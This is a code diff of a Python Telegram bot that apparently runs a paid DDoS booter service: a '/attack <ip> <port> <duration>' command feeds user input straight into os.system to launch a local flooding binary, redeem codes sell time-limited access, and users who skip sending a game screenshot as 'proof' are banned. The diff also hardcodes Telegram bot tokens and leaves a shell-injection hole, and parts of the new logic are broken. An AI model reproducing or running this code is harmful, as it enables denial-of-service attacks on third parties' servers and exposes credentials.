@@ -4,45 +4,35 @@ import random
 import string
 import json
 from datetime import datetime, timedelta
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler
+from telegram import Update
+from telegram.ext import Application, CommandHandler, filters, CallbackContext
 
-# Display startup message
-print("Bot Starting...")
-
-# Load the bot token securely
-TELEGRAM_BOT_TOKEN = '7515339193:AAHq7M4Va5KiqsYEZtzRivaAxiii89iDywA'  # Replace with your bot token
-OWNER_ID = '1866961136'  # Replace with your Telegram ID
+TELEGRAM_BOT_TOKEN = '7898888817:AAHfJQUBpUyxj2LS0v6XZ-ufQok262RPJ70'  
+OWNER_ID = '1866961136'  
 DATA_FILE = 'data.json'
 
-# Store data
 user_access = {}
-group_access = {}
 redeem_codes = {}
-admin_list = [OWNER_ID]
 banned_users = {}
-pending_feedback = {}
+admins = {OWNER_ID}  
+attack_timers = {}
 
-# Load data from JSON
 def load_data():
-    global user_access, group_access, redeem_codes, admin_list, banned_users
+    global user_access, redeem_codes, banned_users, admins
     if os.path.exists(DATA_FILE):
         with open(DATA_FILE, 'r') as f:
             data = json.load(f)
             user_access = data.get('user_access', {})
-            group_access = data.get('group_access', {})
             redeem_codes = data.get('redeem_codes', {})
-            admin_list.extend(data.get('admin_list', []))
             banned_users = data.get('banned_users', {})
+            admins = set(data.get('admins', [OWNER_ID]))
 
-# Save data to JSON
 def save_data():
     data = {
         'user_access': user_access,
-        'group_access': group_access,
         'redeem_codes': redeem_codes,
-        'admin_list': admin_list,
-        'banned_users': banned_users
+        'banned_users': banned_users,
+        'admins': list(admins)
     }
     with open(DATA_FILE, 'w') as f:
         json.dump(data, f)
@@ -51,155 +41,173 @@ async def start(update: Update, context: CallbackContext):
     await update.message.reply_text("🔥 Welcome! Use /help to see available commands.")
 
 async def help_command(update: Update, context: CallbackContext):
-    help_text = (
-        "🔹 /attack <ip> <port> <duration> - Launch an attack\n"
-        "🔹 /redeem <duration> - Generate a redeem code (Admin only)\n"
-        "🔹 /redeem_code <code> - Redeem access to /attack\n"
-        "🔹 /check_access - Check access in group/private\n"
-        "🔹 /add_admin <user_id> - Add an admin (Owner only)\n"
-        "🔹 /remove_admin <user_id> - Remove an admin (Owner only)\n"
-        "🔹 /broadcast <message> - Send a message to all users (Admin only)\n"
+    message = (
+        "🔧 *Available Commands:*\n\n"
+        "/start - Show welcome message\n"
+        "/help - Show this help message\n"
+        "/attack <ip> <port> <duration> - Start an attack\n"
+        "/check_access - Check your access status\n"
+        "/redeem <days> - Generate a redeem code (Admin only)\n"
+        "/redeem_code <code> - Redeem your access\n"
+        "/ban <user_id> <reason> - Ban a user (Admins only)\n"
+        "/banned_users - List banned users (Admins only)\n"
+        "/unban <user_id> - Unban a user (Admins only)\n"
+        "/add_admin <user_id> - Add an admin (Owner only)\n"
+        "/remove_admin <user_id> - Remove an admin (Owner only)"
     )
-    await update.message.reply_text(help_text)
-
-#Attack Run
-async def run_attack(chat_id, ip, port, duration, context):
-    try:
-        process = await asyncio.create_subprocess_shell(
-            f"./Rohan  {ip} {port} {duration}",
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
-        stdout, stderr = await process.communicate()
-
-        if stdout:
-            print(f"[stdout]\n{stdout.decode()}")
-        if stderr:
-            print(f"[stderr]\n{stderr.decode()}")
-
-    except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
-
-    finally:
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
+    await update.message.reply_text(message)
 
 async def attack(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = str(update.effective_user.id)
+    user_id = str(update.message.from_user.id)
+    
+    if user_id in banned_users:
+        await update.message.reply_text("🚫 You are banned from using this bot.")
+        return
 
-#Redeem Code Command
-async def generate_redeem_code(duration):
-    code_suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
-    code = f"Rohan-{code_suffix}"
-    expiry_time = datetime.now() + timedelta(days=duration)
-    redeem_codes[code] = expiry_time.isoformat()
+    args = context.args
+    if len(args) != 3:
+        await update.message.reply_text("⚠️ Usage: /attack <ip> <port> <duration>")
+        return
+
+    ip, port, duration = args
+    duration = int(duration)
+
+    os.system(f"./Rohan {ip} {port} {duration}")
+    await update.message.reply_text(f"⚔️ Attack started on {ip}:{port} for {duration} seconds!")
+
+    for remaining in range(duration, 0, -1):
+        await asyncio.sleep(1)
+        if remaining % 10 == 0 or remaining <= 5:
+            await update.message.reply_text(f"⏳ Attack Time Left: {remaining} sec")
+    
+    await update.message.reply_text("✅ Attack Ended!")
+
+    await update.message.reply_text("📸 Please send a screenshot of the game as proof!")
+
+    await asyncio.sleep(120)
+
+    if user_id not in user_access:
+        banned_users[user_id] = "Failed to provide proof"
+        save_data()
+        await update.message.reply_text(f"🚫 {update.message.from_user.first_name} has been banned!")
+
+async def redeem_access(update: Update, context: CallbackContext):
+    if str(update.message.from_user.id) not in admins:
+        await update.message.reply_text("⚠️ Only admins can generate redeem codes!")
+        return
+
+    args = context.args
+    if len(args) != 1:
+        await update.message.reply_text("⚠️ Usage: /redeem <days>")
+        return
+
+    days = int(args[0])
+    code = "Rohan-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
+    expire_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
+
+    redeem_codes[code] = {"expires": expire_date, "group": update.message.chat_id > 0}
     save_data()
-    return code
+
+    await update.message.reply_text(f"✅ Redeem Code Created: `{code}` (Expires: {expire_date})")
 
 async def redeem_code(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = str(update.effective_user.id)
+    user_id = str(update.message.from_user.id)
+    args = context.args
 
-    if len(context.args) != 1:
-        await update.message.reply_text("Usage: /redeem_code <code>")
+    if len(args) != 1:
+        await update.message.reply_text("⚠️ Usage: /redeem_code <code>")
         return
 
-    code = context.args[0]
+    code = args[0]
 
     if code not in redeem_codes:
-        await update.message.reply_text("Invalid or expired code!")
+        await update.message.reply_text("⚠️ Invalid redeem code!")
         return
 
-    expiry_time = datetime.fromisoformat(redeem_codes.pop(code))
-
-    if str(chat_id).startswith('-'):
-        chat_member = await context.bot.get_chat_member(chat_id, user_id)
-        if chat_member.status not in ['administrator', 'creator']:
-            await update.message.reply_text("Only admins can redeem codes in groups!")
-            return
-        group_access[str(chat_id)] = expiry_time.isoformat()
-        await update.message.reply_text(f"✅ Group access granted until {expiry_time}!")
+    if update.message.chat_id > 0:
+        user_access[user_id] = True
+        await update.message.reply_text("✅ Access Granted!")
     else:
-        user_access[user_id] = expiry_time.isoformat()
-        await update.message.reply_text(f"✅ You have access until {expiry_time}!")
+        group_members = context.bot.get_chat_members(update.message.chat_id)
+        for member in group_members:
+            user_access[str(member.user.id)] = True
+        await update.message.reply_text("✅ Group Access Granted!")
 
+    del redeem_codes[code]
     save_data()
 
-async def check_access(update: Update, context: CallbackContext):
-    chat_id = str(update.effective_chat.id)
-    if chat_id.startswith('-'):
-        expiry = group_access.get(chat_id, "No access")
-        await update.message.reply_text(f"Group access: {expiry}")
-    else:
-        expiry = user_access.get(chat_id, "No access")
-        await update.message.reply_text(f"Your access: {expiry}")
-
-async def attack(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = str(update.effective_user.id)
-
-    if chat_id.startswith('-'):
-        access_expiry = group_access.get(str(chat_id))
-    else:
-        access_expiry = user_access.get(user_id)
-
-    if not access_expiry or datetime.now() > datetime.fromisoformat(access_expiry):
-        await update.message.reply_text("❌ No access! Redeem a code with /redeem_code <code>")
+async def ban(update: Update, context: CallbackContext):
+    if str(update.message.from_user.id) not in admins:
+        await update.message.reply_text("⚠️ Only admins can ban users!")
         return
 
-    if len(context.args) != 3:
-        await update.message.reply_text("Usage: /attack <ip> <port> <duration>")
+    args = context.args
+    if len(args) < 2:
+        await update.message.reply_text("⚠️ Usage: /ban <user_id> <reason>")
         return
 
-    ip, port, duration = context.args
-    await update.message.reply_text(f"🔥 Attack started on {ip}:{port} for {duration} seconds!")
+    user_id = args[0]
+    reason = ' '.join(args[1:])
 
-    pending_feedback[user_id] = chat_id
-    await asyncio.sleep(120)
-    if user_id in pending_feedback:
-        banned_users[user_id] = True
+    banned_users[user_id] = reason
+    save_data()
+    await update.message.reply_text(f"🚫 User {user_id} has been banned! Reason: {reason}")
+
+async def unban(update: Update, context: CallbackContext):
+    if str(update.message.from_user.id) not in admins:
+        await update.message.reply_text("⚠️ Only admins can unban users!")
+        return
+
+    args = context.args
+    if len(args) != 1:
+        await update.message.reply_text("⚠️ Usage: /unban <user_id>")
+        return
+
+    user_id = args[0]
+    if user_id in banned_users:
+        del banned_users[user_id]
         save_data()
-        await update.message.reply_text("⚠️ You have been temporarily banned for not providing feedback.")
+        await update.message.reply_text(f"✅ User {user_id} has been unbanned!")
 
-async def handle_feedback(update: Update, context: CallbackContext):
-    user_id = str(update.effective_user.id)
-    if user_id in pending_feedback:
-        del pending_feedback[user_id]
-        await update.message.reply_text("✅ Thank you for your feedback!")
-    else:
-        await update.message.reply_text("❌ No pending feedback request.")
-
-async def broadcast(update: Update, context: CallbackContext):
-    if str(update.effective_user.id) not in admin_list:
-        await update.message.reply_text("❌ You don't have permission to use this command.")
+async def add_admin(update: Update, context: CallbackContext):
+    if str(update.message.from_user.id) != OWNER_ID:
+        await update.message.reply_text("⚠️ Only the owner can add admins!")
         return
 
-    message = ' '.join(context.args)
-    for user in user_access.keys():
-        try:
-            await context.bot.send_message(chat_id=user, text=message)
-        except:
-            pass
-    for group in group_access.keys():
-        try:
-            await context.bot.send_message(chat_id=group, text=message)
-        except:
-            pass
-    await update.message.reply_text("✅ Broadcast sent!")
+    args = context.args
+    if len(args) != 1:
+        await update.message.reply_text("⚠️ Usage: /add_admin <user_id>")
+        return
 
-def main():
-    load_data()
-    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+    user_id = args[0]
+    admins.add(user_id)
+    save_data()
+    await update.message.reply_text(f"✅ User {user_id} has been added as an admin!")
 
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(CommandHandler("redeem_code", redeem_code))
-    app.add_handler(CommandHandler("check_access", check_access))
-    app.add_handler(CommandHandler("attack", attack))
-    app.add_handler(CommandHandler("broadcast", broadcast))
-    app.add_handler(MessageHandler(filters.PHOTO, handle_feedback))
+async def remove_admin(update: Update, context: CallbackContext):
+    if str(update.message.from_user.id) != OWNER_ID:
+        await update.message.reply_text("⚠️ Only the owner can remove admins!")
+        return
 
-    app.run_polling()
+    args = context.args
+    if len(args) != 1:
+        await update.message.reply_text("⚠️ Usage: /remove_admin <user_id>")
+        return
 
-if __name__ == '__main__':
-    main()
+    user_id = args[0]
+    admins.discard(user_id)
+    save_data()
+    await update.message.reply_text(f"✅ User {user_id} has been removed as an admin!")
+
+app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+app.add_handler(CommandHandler("start", start))
+app.add_handler(CommandHandler("help", help_command))
+app.add_handler(CommandHandler("attack", attack))
+app.add_handler(CommandHandler("redeem", redeem_access))
+app.add_handler(CommandHandler("redeem_code", redeem_code))
+app.add_handler(CommandHandler("ban", ban))
+app.add_handler(CommandHandler("unban", unban))
+app.add_handler(CommandHandler("add_admin", add_admin))
+app.add_handler(CommandHandler("remove_admin", remove_admin))
+
+app.run_polling()
